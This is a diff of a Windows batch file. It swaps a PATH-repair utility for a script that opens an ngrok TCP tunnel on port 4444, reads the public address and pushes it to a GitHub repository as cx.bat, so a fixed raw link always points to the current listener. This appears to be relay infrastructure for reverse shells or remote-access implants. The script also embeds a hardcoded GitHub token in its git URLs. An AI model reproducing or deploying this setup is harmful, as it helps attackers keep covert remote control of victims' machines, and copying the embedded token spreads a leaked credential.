@@ -1,53 +1,54 @@
 @echo off
-setlocal enabledelayedexpansion
-title Windows PATH Error Finder & Fixer
+:: ==========================================
+:: 1. Your GitHub Credentials
+:: ==========================================
+set GITHUB_USER=osmanius21-maker
+set GITHUB_REPO=osm
+set GITHUB_TOKEN=ghp_K0834MD40W60IOMn18XpiyIwVoHG63vzAIl
+set LOCAL_PORT=4444
+set FILE_NAME=cx.bat
 
-:menu
-cls
-echo ==========================================
-echo      SYSTEM PATH ERROR DIAGNOSTICS
-echo ==========================================
-echo 1) Scan for Broken Paths (Invalid Folders)
-echo 2) Auto-Remove Invalid Paths (User)
-echo 3) Auto-Remove Invalid Paths (System - Admin)
-echo 4) List All Paths (Detailed)
-echo 5) Exit
-echo ==========================================
-set /p choice="Select option [1-5]: "
+:: ==========================================
+:: 2. Launch Ngrok
+:: ==========================================
+echo [+] Starting Ngrok TCP on port %LOCAL_PORT%...
+start "" ngrok tcp %LOCAL_PORT%
 
-if "%choice%"=="1" goto scan_path
-if "%choice%"=="2" goto fix_user
-if "%choice%"=="3" goto fix_system
-if "%choice%"=="4" goto list_all
-if "%choice%"=="5" exit
-goto menu
+:: Wait 10 seconds for Ngrok to initialize and generate the URL
+echo [+] Waiting for Ngrok API to initialize...
+timeout /t 10 >nul
 
-:scan_path
-cls
-echo [Scanning for non-existent folders in PATH...]
-echo ------------------------------------------
-powershell -NoProfile -Command "$env:Path -split ';' | ForEach-Object { if (-not (Test-Path $_) -and $_ -ne '') { Write-Host '[INVALID]: ' $_ -ForegroundColor Red } else { if ($_ -ne '') { Write-Host '[VALID]:   ' $_ -ForegroundColor Green } } }"
-echo ------------------------------------------
+:: ==========================================
+:: 3. Extract the TCP URL (Using PowerShell for Accuracy)
+:: ==========================================
+echo [+] Fetching public URL from Ngrok API...
+for /f "delims=" %%i in ('powershell -command "(Invoke-WebRequest -Uri 'http://192.168.1.20:4040/api/tunnels' | ConvertFrom-Json).tunnels.public_url"') do set NEW_LINK=%%i
+
+:: Check if the variable is empty (Ngrok failed to start or API unreachable)
+if "%NEW_LINK%"=="" (
+    echo [!] Error: Could not fetch Ngrok URL. Make sure Ngrok is running.
+    pause
+    exit /b
+)
+
+echo %NEW_LINK% > %FILE_NAME%
+echo [!] NEW LINK DETECTED: %NEW_LINK%
+
+:: ==========================================
+:: 4. Git Commands to Push to GitHub
+:: ==========================================
+echo [+] Syncing with remote repository...
+:: Pull first to avoid "non-fast-forward" errors
+git pull https://%GITHUB_USER%:%GITHUB_TOKEN%@github.com/%GITHUB_USER%/%GITHUB_REPO%.git main
+
+echo [+] Uploading updated link to GitHub...
+git add %FILE_NAME%
+git commit -m "Auto-update Ngrok link: %date% %time%"
+
+:: Push using the authenticated URL
+git push https://%GITHUB_USER%:%GITHUB_TOKEN%@github.com/%GITHUB_USER%/%GITHUB_REPO%.git main
+
+echo.
+echo [+] SUCCESS! Your "Static" GitHub Raw Link is:
+echo https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/%FILE_NAME%
 pause
-goto menu
-
-:fix_user
-cls
-echo [Repairing User PATH...]
-powershell -NoProfile -Command "$old = [Environment]::GetEnvironmentVariable('Path', 'User'); $new = ($old -split ';' | Where-Object { (Test-Path $_) -and $_ -ne '' }) -join ';'; [Environment]::SetEnvironmentVariable('Path', $new, 'User'); Write-Host 'User PATH cleaned from invalid entries.' -ForegroundColor Green"
-pause
-goto menu
-
-:fix_system
-cls
-echo [Repairing System PATH - Requesting Admin...]
-powershell -NoProfile -Command "Start-Process powershell -Verb RunAs -ArgumentList \"-NoProfile -Command $old = [Environment]::GetEnvironmentVariable('Path', 'Machine'); $new = ($old -split ';' | Where-Object { (Test-Path $_) -and $_ -ne '' }) -join ';'; [Environment]::SetEnvironmentVariable('Path', $new, 'Machine'); Write-Host 'System PATH cleaned successfully.' -ForegroundColor Green\""
-pause
-goto menu
-
-:list_all
-cls
-echo [Full PATH List]
-powershell -NoProfile -Command "$env:Path -split ';' | Where-Object { $_ -ne '' }"
-pause
-goto menu
